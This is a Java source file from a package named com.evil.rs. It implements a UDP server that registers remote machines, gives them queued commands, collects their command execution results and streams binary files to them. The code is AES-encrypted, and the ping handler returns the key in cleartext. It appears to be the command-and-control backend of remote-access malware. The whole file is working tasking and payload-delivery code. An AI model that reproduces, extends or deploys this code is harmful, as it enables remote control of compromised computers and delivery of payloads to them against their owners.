package com.evil.rs.socket;

import com.alibaba.fastjson.JSON;
import com.evil.rs.config.ConstConfig;
import com.evil.rs.config.ServerConfig;
import com.evil.rs.entity.Machine;
import com.evil.rs.entity.SocketMessage;
import com.evil.rs.enums.CommonStringEnums;
import com.evil.rs.model.ReceiverModel;
import com.evil.rs.service.CommandService;
import com.evil.rs.service.EncryptServices;
import com.evil.rs.service.MachineService;
import com.evil.rs.utils.AESUtil;
import com.evil.rs.utils.Result;
import com.evil.rs.utils.SpringUtil;
import lombok.extern.slf4j.Slf4j;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.*;

@Slf4j
public class UDPServer implements Runnable {

    EncryptServices encryptServices;
    CommandService commandService;
    MachineService machineService;

    public void run() {
        // 通过工具类注入
        this.encryptServices = SpringUtil.getBean(EncryptServices.class);
        this.commandService = SpringUtil.getBean(CommandService.class);
        this.machineService = SpringUtil.getBean(MachineService.class);
        // 开启监听
        try (DatagramSocket serverSocket = new DatagramSocket(ConstConfig.UDP_PORT)) {
            // 设置缓冲区大小
            serverSocket.setReceiveBufferSize(ServerConfig.SOCKET_BUFFER);
            byte[] receiveData = new byte[ServerConfig.SOCKET_BUFFER];

            while (true) {
                // 接受数据
                DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
                serverSocket.receive(receivePacket);
                // 处理数据
                DatagramPacket response = handleClientDataPacket(serverSocket, receivePacket);
                // 发送回复消息给客户端
                serverSocket.send(response);
            }
        } catch (Exception e) {
            log.info("监听端口失败: {}", e.getMessage());
        }
    }

    /**
     * 处理客户端数据包
     * @param serverSocket 服务端管道
     * @param receivePacket 接受的数据包
     * @return 返回数据包
     */
    private DatagramPacket handleClientDataPacket(DatagramSocket serverSocket, DatagramPacket receivePacket) {
        DatagramPacket sendPacket = null;
        // 接受的真实数据
        String result = "";
        String receivedMessage = new String(receivePacket.getData(), 0, receivePacket.getLength());
        InetAddress clientAddress = receivePacket.getAddress();
        int clientPort = receivePacket.getPort();
        // 获取加密key的主机ip地址
        String clientIpaddr = clientAddress.getHostAddress();
        String aesKey = encryptServices.getAesKey(clientIpaddr);
        // 开门请求
        if (CommonStringEnums.UDP_PING_MSG.getDescription().equals(receivedMessage)){
            sendPacket = new DatagramPacket(aesKey.getBytes(), aesKey.length(), clientAddress, clientPort);
        } else{
            // 解密请求
            try{
                byte[] decrypt_data = AESUtil.decrypt(receivedMessage.getBytes(), aesKey.getBytes());
                String decryptString = new String(decrypt_data);
//                log.info("解密数据：" + decryptString);
                SocketMessage socketMessage = JSON.parseObject(decryptString, SocketMessage.class);
                // 获取数据
                String token = socketMessage.getToken();
                String data = socketMessage.getData();
                String route = socketMessage.getRoute();
                if (CommonStringEnums.SOCKET_MSG_ONLINE.getDescription().equals(route)){
                    // 加密数据
                    Machine machine = JSON.parseObject(data, Machine.class);
                    machine.setCurrentProtocol(CommonStringEnums.UDP_PROTOCOL.getDescription());
                    String responseData = JSON.toJSONString(machineService.getConfigByMachineInformation(machine));
                    String encryptData = AESUtil.encrypt(responseData.getBytes(), aesKey.getBytes());
                    result = JSON.toJSONString(Result.Ok(encryptData));
                }
                if (CommonStringEnums.SOCKET_MSG_TASK_LIST.getDescription().equals(route)){
                    String responseData = JSON.toJSONString(commandService.listByToken(token));
                    String encryptData = AESUtil.encrypt(responseData.getBytes(), aesKey.getBytes());
                    result = JSON.toJSONString(Result.Ok(encryptData));
                }
                if (CommonStringEnums.SOCKET_MSG_RECEIVER.getDescription().equals(route)){
                    ReceiverModel receiverModel = JSON.parseObject(data, ReceiverModel.class);
                    System.out.println(receiverModel);
                    commandService.saveExecutionResult(token, receiverModel);
                    result = JSON.toJSONString(Result.Ok());
                }
                if (CommonStringEnums.SOCKET_MSG_DOWNLOAD.getDescription().equals(route)){
                    String filename = commandService.getBinaryData(token, data);
                    File file = new File(filename);
                    if (file.exists()){
                        try (FileInputStream fis = new FileInputStream(file)) {
                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            while ((bytesRead = fis.read(buffer)) != -1){
                                sendPacket = new DatagramPacket(buffer, bytesRead, clientAddress, clientPort);
                                serverSocket.send(sendPacket);
                            }
                        } catch (IOException e) {
                            log.info("传输失败: {}", e.getMessage());
                        }
                    }
                }
                sendPacket = new DatagramPacket(result.getBytes(), result.length(), clientAddress, clientPort);
            }catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        return sendPacket;
    }

}
